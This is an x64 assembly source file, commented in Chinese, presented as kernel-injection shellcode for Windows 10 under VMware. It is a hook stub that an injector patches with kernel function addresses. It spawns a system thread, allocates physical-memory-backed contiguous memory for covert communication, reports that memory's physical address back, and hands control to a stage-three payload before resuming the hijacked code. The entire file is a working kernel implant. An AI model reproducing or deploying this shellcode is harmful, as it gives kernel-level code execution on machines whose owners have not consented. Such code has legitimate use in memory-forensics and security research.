;Win10X64Inject.asm : VmWare Win10X64内核注入执行代码(ShellCode)

EXTRN WX64STAGE3EntryPoint:NEAR

.CODE

sdmain PROC
	; ----------------------------------------------------
	; 0:初始函数和内存位置，初始填充值
	; ----------------------------------------------------
	JMP MainStart 
	DataFiller				    	db 00h, 00h				; +002
	OriginalCode:
	DataOriginalCode				dd 44444444h, 44444444h, 44444444h, 44444444h, 44444444h	; +004
	AddrData						dq 1111111111111111h	; +018 DataBlock
	pfnKeGetCurrentIrql				dq 1111111111111111h	; +020
	pfnPsCreateSystemThread			dq 1111111111111111h	; +028
	pfnZwClose						dq 1111111111111111h	; +030
	pfnMmAllocateContiguousMemory	dq 1111111111111111h	; +038
	pfnMmGetPhysicalAddress			dq 1111111111111111h	; +040
	KernelBaseAddr					dq 1111111111111111h	; +048
	; ----------------------------------------------------
	; 1: 保存原始参数
	; ----------------------------------------------------
MainStart:
	PUSH rcx
	PUSH rdx
	PUSH r8
	PUSH r9
	PUSH r10
	PUSH r11
	PUSH r12
	PUSH r13
	PUSH r14
	PUSH r15
	PUSH rdi
	PUSH rsi
	PUSH rbx
	PUSH rbp
	SUB rsp, 020h
	; ----------------------------------------------------
	;检查当前的IRQL——只允许IRQL(PASSIVE_LEVEL)
	; ----------------------------------------------------
	CALL [pfnKeGetCurrentIrql]
	TEST rax, rax
	JNZ SkipCall
	; ----------------------------------------------------
	; 确保线程的原子性
	; ----------------------------------------------------
	MOV al, 00h
	MOV dl, 01h
	MOV rcx, AddrData
	LOCK CMPXCHG [rcx], dl
	JNE SkipCall
	; ----------------------------------------------------
	; 创建系统线程
	; ----------------------------------------------------
	PUSH r12					; StartContext
	LEA rax, ThreadProcedure
	PUSH rax					; StartRoutine
	PUSH 0						; ClientId
	SUB rsp, 020h				; (stack shadow space)
	XOR r9, r9					; ProcessHandle
	XOR r8, r8					; ObjectAttributes
	MOV rdx, 1fffffh			; DesiredAccess
	MOV rcx, AddrData			; ThreadHandle
	ADD rcx, 8
	CALL [pfnPsCreateSystemThread]
	ADD rsp, 038h
	; ----------------------------------------------------
	; 关闭线程句柄
	; ----------------------------------------------------
	SUB rsp, 038h				
	MOV rcx, AddrData			; ThreadHandle
	MOV rcx, [rcx+8]
	CALL [pfnZwClose]
	ADD rsp, 038h
	; ----------------------------------------------------
	; 退出-恢复和JMP返回
	; ----------------------------------------------------
SkipCall:
	ADD rsp, 020h
	POP rbp
	POP rbx
	POP rsi
	POP rdi
	POP r15
	POP r14
	POP r13
	POP r12
	POP r11
	POP r10
	POP r9
	POP r8
	POP rdx
	POP rcx
	JMP OriginalCode
sdmain ENDP

; ----------------------------------------------------
;  新的线程入口点。分配内存并写回物理地址
; ----------------------------------------------------
ThreadProcedure PROC
	; ----------------------------------------------------
	; 设置堆栈空间(函数调用需要)
	; ----------------------------------------------------
	PUSH rbp
	MOV rbp, rsp
	SUB rsp, 020h
	; ----------------------------------------------------
	; 在0x7fffffff下面分配0x1000连续内存,用来通信
	; ----------------------------------------------------
	MOV rcx, 1000h
	MOV rdx, 7fffffffh
	CALL [pfnMmAllocateContiguousMemory]
	MOV r13, rax
	; ----------------------------------------------------
	; ZeroMemroy();
	; ----------------------------------------------------
	XOR rax, rax
	MOV ecx, 200h
	ClearLoop:
	DEC ecx
	MOV [r13+rcx*8], rax
	JNZ ClearLoop
	; ----------------------------------------------------
	; 写入物理内存地址
	; ----------------------------------------------------
	MOV rcx, r13
	CALL [pfnMmGetPhysicalAddress]
	MOV rcx, AddrData
	MOV [rcx+01ch], eax
	; ----------------------------------------------------
	; SET PKMDJATA->KernelBaseAddr
	; ----------------------------------------------------
	MOV rax, KernelBaseAddr
	MOV [r13+8], rax
	; ----------------------------------------------------
	; CALL C-WX64STAGE3EntryPoint
	; ----------------------------------------------------
	MOV rcx, r13
	CALL WX64STAGE3EntryPoint
	; ----------------------------------------------------
	; RETURN返回
	; ----------------------------------------------------
	ADD rsp, 028h
	XOR rax, rax
	RET
ThreadProcedure ENDP

END
